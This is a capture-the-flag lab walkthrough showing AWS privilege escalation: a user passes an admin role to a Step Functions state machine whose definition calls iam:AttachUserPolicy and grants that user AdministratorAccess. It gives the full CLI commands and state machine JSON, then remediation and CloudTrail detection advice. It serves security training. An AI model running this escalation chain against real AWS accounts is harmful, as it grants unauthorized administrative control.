# Guided Walkthrough: Privilege Escalation via iam:PassRole + states:CreateStateMachine + states:StartExecution

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `states:CreateStateMachine`, and `states:StartExecution` permissions can create an AWS Step Functions state machine that calls IAM APIs directly — without any container, Lambda function, or external storage — and use those API calls to grant the starting user `AdministratorAccess`.

AWS Step Functions supports AWS SDK service integrations for thousands of AWS API actions, including every IAM action. The state machine definition (Amazon States Language JSON) specifies the API to call and the parameters to pass. When the state machine executes, Step Functions assumes the role passed as the execution role and makes the API call on behalf of the state machine. An attacker who can pass a privileged role to Step Functions effectively executes arbitrary AWS API calls as that role without ever calling `sts:AssumeRole` directly.

## The Challenge

You start as `pl-prod-stepfunctions-001-to-admin-starting-user` — an IAM user whose credentials were provided via Terraform outputs. At first glance these permissions look like they belong to a workflow automation engineer: the ability to create and execute Step Functions state machines, plus `iam:PassRole` on a specific role. Your goal is to reach full administrator access.

The target is `pl-prod-stepfunctions-001-to-admin-admin-role`, an IAM role carrying `AdministratorAccess`. You cannot assume it directly — there is no `sts:AssumeRole` permission in your policy, and even if there were, the role's trust policy only permits `states.amazonaws.com`. But you can pass it as the execution role for a state machine you create.

## Reconnaissance

Start by confirming who you are and what region you are operating in:

```bash
aws sts get-caller-identity
```

Inspect the inline policy attached to your user to understand the full permission set:

```bash
aws iam list-user-policies --user-name pl-prod-stepfunctions-001-to-admin-starting-user
aws iam get-user-policy \
    --user-name pl-prod-stepfunctions-001-to-admin-starting-user \
    --policy-name pl-prod-stepfunctions-001-to-admin-starting-user-policy
```

You will see `iam:PassRole` scoped to the admin role ARN, plus `states:CreateStateMachine` and `states:StartExecution`. You also have helpful permissions — `states:DescribeExecution`, `states:DescribeStateMachine`, `iam:ListAttachedUserPolicies` — for monitoring and verification.

## Exploitation

### Step 1: Create a Step Functions state machine with the admin role

Craft an Amazon States Language definition with a single Task state that calls `iam:AttachUserPolicy` via the Step Functions AWS SDK integration. Pass the admin role as the execution role — Step Functions will assume it when running the state machine.

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
REGION="us-east-1"  # adjust to your deployed region
STARTING_USER="pl-prod-stepfunctions-001-to-admin-starting-user"
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-stepfunctions-001-to-admin-admin-role"
STATE_MACHINE_NAME="pl-prod-stepfunctions-001-to-admin-privesc-sfn"

DEFINITION=$(cat <<'EOF'
{
  "Comment": "Privilege escalation via Step Functions SDK integration",
  "StartAt": "AttachAdminPolicy",
  "States": {
    "AttachAdminPolicy": {
      "Type": "Task",
      "Resource": "arn:aws:states:::aws-sdk:iam:attachUserPolicy",
      "Parameters": {
        "UserName": "pl-prod-stepfunctions-001-to-admin-starting-user",
        "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
      },
      "End": true
    }
  }
}
EOF
)

aws stepfunctions create-state-machine \
    --region "$REGION" \
    --name "$STATE_MACHINE_NAME" \
    --definition "$DEFINITION" \
    --role-arn "$ADMIN_ROLE_ARN" \
    --type STANDARD
```

Note the `stateMachineArn` in the response.

### Step 2: Start execution of the state machine

```bash
STATE_MACHINE_ARN="<stateMachineArn from previous step>"

aws stepfunctions start-execution \
    --region "$REGION" \
    --state-machine-arn "$STATE_MACHINE_ARN"
```

Note the `executionArn` in the response.

### Step 3: Wait for execution to complete

Step Functions state machines complete quickly for SDK integrations — typically within a few seconds. Poll until the status is `SUCCEEDED`.

```bash
EXECUTION_ARN="<executionArn from previous step>"

aws stepfunctions describe-execution \
    --region "$REGION" \
    --execution-arn "$EXECUTION_ARN" \
    --query 'status' \
    --output text
```

If the status shows `FAILED`, inspect the error:

```bash
aws stepfunctions describe-execution \
    --region "$REGION" \
    --execution-arn "$EXECUTION_ARN" \
    --output json
```

## Verification

Once execution succeeds, wait 15 seconds for IAM policy propagation, then verify that `AdministratorAccess` was attached to the starting user:

```bash
sleep 15
aws iam list-attached-user-policies --user-name pl-prod-stepfunctions-001-to-admin-starting-user
```

Confirm admin access using the starting user's credentials:

```bash
aws iam list-users --max-items 3
```

If this succeeds, you have achieved administrator access.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/stepfunctions-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a privilege escalation path that is easy to overlook during IAM reviews. The `iam:PassRole` permission is commonly granted to developers who orchestrate workflows. When combined with `states:CreateStateMachine` and `states:StartExecution`, it becomes a zero-infrastructure code execution primitive: you can define arbitrary AWS API calls in a JSON document and execute them as any role you can pass, with no containers, no S3 buckets, and no VPC configuration required.

The key insight is that Step Functions' AWS SDK service integrations allow a state machine definition to directly call over 9,000 AWS API actions — including every IAM action — using the role passed as the execution role. Unlike Lambda-based escalation paths that require uploading and invoking function code, this attack requires only a JSON document. The state machine executes the `iam:AttachUserPolicy` call as the admin role, attaching `AdministratorAccess` to the starting user in seconds.

This pattern appears in real environments where automation teams are given Step Functions permissions for workflow orchestration. The fix is to scope `iam:PassRole` with an `iam:PassedToService` condition key (e.g., `states.amazonaws.com`) and restrict which roles can be passed by ARN pattern. Any role passable to Step Functions should carry only the minimum permissions needed for the workflow — never administrative policies. CloudTrail events to monitor include `states:CreateStateMachine` calls where the state machine definition contains `aws-sdk:iam:` resource strings, which indicate potential IAM manipulation via Step Functions.
